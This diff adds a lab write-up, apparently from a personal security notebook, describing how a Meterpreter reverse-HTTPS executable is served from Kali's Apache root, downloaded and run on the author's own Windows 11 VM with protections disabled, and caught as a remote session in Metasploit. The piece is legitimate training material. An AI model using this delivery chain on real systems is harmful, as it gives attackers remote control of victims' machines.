@@ -2301,3 +2301,309 @@ At this stage, nothing should connect yet. The listener is simply waiting. The n
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 
 
+
+ Lab: Delivering and Testing a Windows Reverse-HTTPS Payload
+
+ Objective
+
+The objective of this lab was to test a Windows reverse-HTTPS payload in an isolated virtual environment.
+
+ Lab Environment
+
+ Attacker: Kali Linux
+ Target: Windows 11 VM
+ Payload: Windows Meterpreter Reverse HTTPS
+ Listener: Metasploit `exploit/multi/handler`
+ Web Server: Apache2
+ Payload: `rev_https_8080.exe`
+
+> Lab Safety: This exercise was performed only against my own Windows 11 virtual machine in an isolated lab environment.
+
+---
+
+ 1. Prepare the Apache Web Server Directory
+
+The generated payload was initially located on the Kali Desktop:
+
+```bash
+/home/kali/Desktop/rev_https_8080.exe
+```
+
+I first moved to the Apache web root:
+
+```bash
+cd /var/www/html
+```
+
+Then switched to root privileges:
+
+```bash
+sudo su
+```
+
+I navigated to the Kali Desktop:
+
+```bash
+cd /home/kali/Desktop
+```
+
+I verified that the payload was present:
+
+```bash
+ls
+```
+
+Output:
+
+```text
+rev_https_8080.exe
+```
+
+I then moved the payload into the Apache web root:
+
+```bash
+mv rev_https_8080.exe /var/www/html
+```
+
+I verified the file:
+
+```bash
+cd /var/www/html
+ls
+```
+
+The output showed:
+
+```text
+index.html
+index.nginx-debian.html
+rev_https_8080.exe
+```
+
+---
+
+ 2. Create a Dedicated Directory for the Payload
+
+To keep the lab files organized, I created a separate directory:
+
+```bash
+mkdir evil-files
+```
+
+I then moved the payload into this directory:
+
+```bash
+mv rev_https_8080.exe /var/www/html/evil-files
+```
+
+I verified the contents:
+
+```bash
+cd /var/www/html/evil-files
+ls
+```
+
+Output:
+
+```text
+rev_https_8080.exe
+```
+
+The final directory structure was:
+
+```text
+/var/www/html/
+├── index.html
+├── index.nginx-debian.html
+└── evil-files/
+    └── rev_https_8080.exe
+```
+
+---
+
+ 3. Start the Apache Web Server
+
+I started Apache using:
+
+```bash
+service apache2 start
+```
+
+Then I checked its status:
+
+```bash
+service apache2 status
+```
+
+The service showed:
+
+```text
+Active: active (running)
+```
+
+This confirmed that Apache was successfully running and ready to serve the lab file.
+
+---
+
+ 4. Determine the Kali Linux IP Address
+
+The Windows 11 VM needs to connect to the Kali web server, so I checked the Kali machine's IP address:
+
+```bash
+ifconfig
+```
+
+For this lab, the Kali IP address was:
+
+```text
+192.168.0.26
+```
+
+Therefore, the payload could be accessed from the Windows VM through:
+
+```text
+http://192.168.0.26/evil-files/
+```
+
+---
+
+ 5. Download the Payload on the Windows 11 VM
+
+I switched to my Windows 11 virtual machine and opened a web browser.
+
+I entered the Kali Linux IP address followed by the `evil-files` directory:
+
+```text
+http://192.168.0.26/evil-files/
+```
+
+The Apache directory displayed the payload:
+
+```text
+rev_https_8080.exe
+```
+
+I downloaded the payload to the Windows 11 VM.
+
+ Lab Security Configuration
+
+Because this was an isolated lab and the basic payload was not designed to bypass Windows security protections, I temporarily disabled the required Windows security controls for the purpose of this test.
+
+The purpose here was simply to verify that the payload generated earlier could execute and establish the expected connection.
+
+---
+
+ 6. Execute the Payload on Windows 11
+
+After downloading the payload, I located:
+
+```text
+rev_https_8080.exe
+```
+
+on the Windows 11 VM.
+
+I then executed the file.
+
+Once executed, the payload attempted to establish the reverse connection that had been configured during payload generation.
+
+The communication flow was:
+
+```text
+Windows 11 VM
+      │
+      │ Reverse HTTPS
+      ▼
+Kali Linux
+      │
+      │ Port 8080
+      ▼
+Metasploit Multi Handler
+```
+
+---
+
+ 7. Receive the Reverse Connection in Metasploit
+
+On the Kali Linux machine, the Metasploit multi-handler was already configured with the same payload and connection parameters used when generating the executable.
+
+After the executable was launched on Windows 11, the listener received the incoming connection.
+
+The Metasploit console then provided a Meterpreter session.
+
+This confirmed that the Windows VM had successfully established the expected reverse connection to the Kali machine.
+
+---
+
+ 8. Verify the Target with `sysinfo`
+
+After receiving the Meterpreter session, I used:
+
+```text
+sysinfo
+```
+
+<img width="843" height="154" alt="Screenshot 2026-08-10 at 3 52 57 PM" src="https://github.com/user-attachments/assets/816204b4-c571-4d07-8802-f06c91babc55" />
+
+
+The command returned information about the connected Windows machine, including details such as:
+
+```text
+Computer        : <Windows computer name>
+OS              : Windows
+Architecture    : x64
+```
+
+This allowed me to verify that the connected system was my Windows 11 test VM.
+
+---
+
+ 9. Lab Result
+
+The complete workflow was successfully demonstrated:
+
+```text
+Generate Payload
+       ↓
+Move Payload to Apache Web Root
+       ↓
+Create evil-files Directory
+       ↓
+Move Payload into evil-files
+       ↓
+Start Apache2
+       ↓
+Windows 11 → Kali IP/evil-files
+       ↓
+Download rev_https_8080.exe
+       ↓
+Execute Payload in Windows 11 VM
+       ↓
+Reverse Connection
+       ↓
+Metasploit Multi Handler
+       ↓
+Meterpreter Session
+       ↓
+sysinfo
+       ↓
+Verify Windows Target
+```
+
+ Key Concepts Learned
+
+ Apache web server configuration
+ Serving files from `/var/www/html`
+ Organizing lab payloads
+ Payload delivery inside a controlled environment
+ Reverse HTTPS connections
+ Metasploit multi-handler
+ Meterpreter sessions
+ Using `sysinfo` for basic target identification
+ Matching the payload configuration with the listener configuration
+
+> Conclusion: This lab demonstrated the complete process of serving a previously generated test payload from Kali Linux, retrieving and executing it on my Windows 11 VM, receiving the resulting reverse connection through Metasploit, and verifying the target system with `sysinfo`.
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
